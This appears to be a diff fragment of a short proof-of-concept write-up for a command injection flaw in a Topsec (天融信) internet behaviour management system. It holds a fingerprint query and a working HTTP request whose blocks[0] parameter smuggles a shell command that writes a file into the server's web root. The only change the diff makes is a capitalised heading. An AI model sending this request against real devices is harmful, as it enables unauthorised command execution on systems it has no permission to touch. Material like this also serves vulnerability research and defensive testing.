@@ -5,7 +5,7 @@
 app="天融信-上网行为管理系统"
 ```
 
-## poc
+## POC
 ```
 GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'pstvamqlkzrgslfilwvf'%20>>%20/var/www/html/rrlmkkyopirhaviko.txt%0A HTTP/1.1
 Host: 192.168.40.130:8443
